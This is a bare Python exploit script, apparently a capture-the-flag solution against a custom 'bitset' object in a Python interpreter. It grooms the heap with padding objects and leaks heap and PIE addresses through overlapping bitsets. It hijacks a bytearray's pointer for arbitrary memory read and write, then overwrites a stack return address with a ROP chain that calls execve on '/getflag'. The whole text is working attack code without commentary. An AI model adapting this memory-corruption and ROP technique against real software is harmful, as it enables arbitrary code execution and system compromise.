b = bitset

pad = []
for _ in range(0x2000):
    pad.append(b(191))

# Leak python heap
x = b(191)
px1 = b(191)
px2 = b(191)
px3 = b(191)

y = b(191)
py1 = b(191)
LEAK_BYTEARR = bytearray(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

z = b(191)
pz1 = b(191)
v = b(191)
pz3 = b(191)
del z

z = x | y

lh = b(191)
plh1 = b(191)
leak_heap = b(191)
plh3 = b(191)
del lh

for i in range(191):
    px2[i] = True

lh = z & x
leak_pie_addr = int(str(leak_heap)[-128:-64], 2) - 0x38

# Get control over LEAK_BYTEARR and leak PIE
lp_or = b(191)
plp_or1 = b(191)
plp_or2 = b(191)
leak_pie_or = b(191)
lp_and = b(191)
plp_and1 = b(191)
plp_and2 = b(191)
CTRL_BYTEARR = b(191)

CTRL_BYTEARR[64]  = bool((leak_pie_addr >> 0) & 1)
CTRL_BYTEARR[128] = bool((leak_pie_addr >> 0) & 1)
CTRL_BYTEARR[65]  = bool((leak_pie_addr >> 1) & 1)
CTRL_BYTEARR[129] = bool((leak_pie_addr >> 1) & 1)
CTRL_BYTEARR[66]  = bool((leak_pie_addr >> 2) & 1)
CTRL_BYTEARR[130] = bool((leak_pie_addr >> 2) & 1)
CTRL_BYTEARR[67]  = bool((leak_pie_addr >> 3) & 1)
CTRL_BYTEARR[131] = bool((leak_pie_addr >> 3) & 1)
CTRL_BYTEARR[68]  = bool((leak_pie_addr >> 4) & 1)
CTRL_BYTEARR[132] = bool((leak_pie_addr >> 4) & 1)
CTRL_BYTEARR[69]  = bool((leak_pie_addr >> 5) & 1)
CTRL_BYTEARR[133] = bool((leak_pie_addr >> 5) & 1)
CTRL_BYTEARR[70]  = bool((leak_pie_addr >> 6) & 1)
CTRL_BYTEARR[134] = bool((leak_pie_addr >> 6) & 1)
CTRL_BYTEARR[71]  = bool((leak_pie_addr >> 7) & 1)
CTRL_BYTEARR[135] = bool((leak_pie_addr >> 7) & 1)
CTRL_BYTEARR[72]  = bool((leak_pie_addr >> 8) & 1)
CTRL_BYTEARR[136] = bool((leak_pie_addr >> 8) & 1)
CTRL_BYTEARR[73]  = bool((leak_pie_addr >> 9) & 1)
CTRL_BYTEARR[137] = bool((leak_pie_addr >> 9) & 1)
CTRL_BYTEARR[74]  = bool((leak_pie_addr >> 10) & 1)
CTRL_BYTEARR[138] = bool((leak_pie_addr >> 10) & 1)
CTRL_BYTEARR[75]  = bool((leak_pie_addr >> 11) & 1)
CTRL_BYTEARR[139] = bool((leak_pie_addr >> 11) & 1)
CTRL_BYTEARR[76]  = bool((leak_pie_addr >> 12) & 1)
CTRL_BYTEARR[140] = bool((leak_pie_addr >> 12) & 1)
CTRL_BYTEARR[77]  = bool((leak_pie_addr >> 13) & 1)
CTRL_BYTEARR[141] = bool((leak_pie_addr >> 13) & 1)
CTRL_BYTEARR[78]  = bool((leak_pie_addr >> 14) & 1)
CTRL_BYTEARR[142] = bool((leak_pie_addr >> 14) & 1)
CTRL_BYTEARR[79]  = bool((leak_pie_addr >> 15) & 1)
CTRL_BYTEARR[143] = bool((leak_pie_addr >> 15) & 1)
CTRL_BYTEARR[80]  = bool((leak_pie_addr >> 16) & 1)
CTRL_BYTEARR[144] = bool((leak_pie_addr >> 16) & 1)
CTRL_BYTEARR[81]  = bool((leak_pie_addr >> 17) & 1)
CTRL_BYTEARR[145] = bool((leak_pie_addr >> 17) & 1)
CTRL_BYTEARR[82]  = bool((leak_pie_addr >> 18) & 1)
CTRL_BYTEARR[146] = bool((leak_pie_addr >> 18) & 1)
CTRL_BYTEARR[83]  = bool((leak_pie_addr >> 19) & 1)
CTRL_BYTEARR[147] = bool((leak_pie_addr >> 19) & 1)
CTRL_BYTEARR[84]  = bool((leak_pie_addr >> 20) & 1)
CTRL_BYTEARR[148] = bool((leak_pie_addr >> 20) & 1)
CTRL_BYTEARR[85]  = bool((leak_pie_addr >> 21) & 1)
CTRL_BYTEARR[149] = bool((leak_pie_addr >> 21) & 1)
CTRL_BYTEARR[86]  = bool((leak_pie_addr >> 22) & 1)
CTRL_BYTEARR[150] = bool((leak_pie_addr >> 22) & 1)
CTRL_BYTEARR[87]  = bool((leak_pie_addr >> 23) & 1)
CTRL_BYTEARR[151] = bool((leak_pie_addr >> 23) & 1)
CTRL_BYTEARR[88]  = bool((leak_pie_addr >> 24) & 1)
CTRL_BYTEARR[152] = bool((leak_pie_addr >> 24) & 1)
CTRL_BYTEARR[89]  = bool((leak_pie_addr >> 25) & 1)
CTRL_BYTEARR[153] = bool((leak_pie_addr >> 25) & 1)
CTRL_BYTEARR[90]  = bool((leak_pie_addr >> 26) & 1)
CTRL_BYTEARR[154] = bool((leak_pie_addr >> 26) & 1)
CTRL_BYTEARR[91]  = bool((leak_pie_addr >> 27) & 1)
CTRL_BYTEARR[155] = bool((leak_pie_addr >> 27) & 1)
CTRL_BYTEARR[92]  = bool((leak_pie_addr >> 28) & 1)
CTRL_BYTEARR[156] = bool((leak_pie_addr >> 28) & 1)
CTRL_BYTEARR[93]  = bool((leak_pie_addr >> 29) & 1)
CTRL_BYTEARR[157] = bool((leak_pie_addr >> 29) & 1)
CTRL_BYTEARR[94]  = bool((leak_pie_addr >> 30) & 1)
CTRL_BYTEARR[158] = bool((leak_pie_addr >> 30) & 1)
CTRL_BYTEARR[95]  = bool((leak_pie_addr >> 31) & 1)
CTRL_BYTEARR[159] = bool((leak_pie_addr >> 31) & 1)
CTRL_BYTEARR[96]  = bool((leak_pie_addr >> 32) & 1)
CTRL_BYTEARR[160] = bool((leak_pie_addr >> 32) & 1)
CTRL_BYTEARR[97]  = bool((leak_pie_addr >> 33) & 1)
CTRL_BYTEARR[161] = bool((leak_pie_addr >> 33) & 1)
CTRL_BYTEARR[98]  = bool((leak_pie_addr >> 34) & 1)
CTRL_BYTEARR[162] = bool((leak_pie_addr >> 34) & 1)
CTRL_BYTEARR[99]  = bool((leak_pie_addr >> 35) & 1)
CTRL_BYTEARR[163] = bool((leak_pie_addr >> 35) & 1)
CTRL_BYTEARR[100] = bool((leak_pie_addr >> 36) & 1)
CTRL_BYTEARR[164] = bool((leak_pie_addr >> 36) & 1)
CTRL_BYTEARR[101] = bool((leak_pie_addr >> 37) & 1)
CTRL_BYTEARR[165] = bool((leak_pie_addr >> 37) & 1)
CTRL_BYTEARR[102] = bool((leak_pie_addr >> 38) & 1)
CTRL_BYTEARR[166] = bool((leak_pie_addr >> 38) & 1)
CTRL_BYTEARR[103] = bool((leak_pie_addr >> 39) & 1)
CTRL_BYTEARR[167] = bool((leak_pie_addr >> 39) & 1)
CTRL_BYTEARR[104] = bool((leak_pie_addr >> 40) & 1)
CTRL_BYTEARR[168] = bool((leak_pie_addr >> 40) & 1)
CTRL_BYTEARR[105] = bool((leak_pie_addr >> 41) & 1)
CTRL_BYTEARR[169] = bool((leak_pie_addr >> 41) & 1)
CTRL_BYTEARR[106] = bool((leak_pie_addr >> 42) & 1)
CTRL_BYTEARR[170] = bool((leak_pie_addr >> 42) & 1)
CTRL_BYTEARR[107] = bool((leak_pie_addr >> 43) & 1)
CTRL_BYTEARR[171] = bool((leak_pie_addr >> 43) & 1)
CTRL_BYTEARR[108] = bool((leak_pie_addr >> 44) & 1)
CTRL_BYTEARR[172] = bool((leak_pie_addr >> 44) & 1)
CTRL_BYTEARR[109] = bool((leak_pie_addr >> 45) & 1)
CTRL_BYTEARR[173] = bool((leak_pie_addr >> 45) & 1)
CTRL_BYTEARR[110] = bool((leak_pie_addr >> 46) & 1)
CTRL_BYTEARR[174] = bool((leak_pie_addr >> 46) & 1)
CTRL_BYTEARR[111] = bool((leak_pie_addr >> 47) & 1)
CTRL_BYTEARR[175] = bool((leak_pie_addr >> 47) & 1)

del lp_or
lp_or = px3 | x

del lp_and
lp_and = px3 & lp_or

def p64(n):
    return int.to_bytes(n, 8, byteorder='little')

def u64(n):
    return int.from_bytes(n, byteorder='little')

def do_leak(addr):
    CTRL_BYTEARR[0x18:0x28] = p64(addr) * 2
    return u64(LEAK_BYTEARR[:8])


PYBYTEARRAYTYPE_OFF = 0x569a40
ENVIRON_PIE_OFF = 0x6d6740

PIE_BASE = u64(CTRL_BYTEARR[:8]) - PYBYTEARRAYTYPE_OFF
RETADDR = do_leak(PIE_BASE + ENVIRON_PIE_OFF) - 0x4a8

POP_RAX = PIE_BASE + 0x153be4           #: pop rax ; ret
POP_RDI = PIE_BASE + 0x1009ad           #: pop rdi ; ret
POP_RSI = PIE_BASE + 0x10edbd           #: pop rsi ; ret
POP_RDX = PIE_BASE + 0x192f72           #: pop rdx ; ret
SYSCALL = PIE_BASE + 0x13705d           #: syscall

CTRL_BYTEARR[0x8:0x28] = p64(0x100) + p64(0x101) + p64(RETADDR) * 2

rop = b''
rop += p64(POP_RAX)
rop += p64(0x3b)
rop += p64(POP_RDI)
rop += b'RDI_VAL_'
rop += p64(POP_RSI)
rop += p64(0)
rop += p64(POP_RDX)
rop += p64(0)
rop += p64(SYSCALL)
rop = rop.replace(b'RDI_VAL_', p64(RETADDR + len(rop)))
rop += b'/getflag'
rop += p64(0)

LEAK_BYTEARR[0:len(rop)] = rop
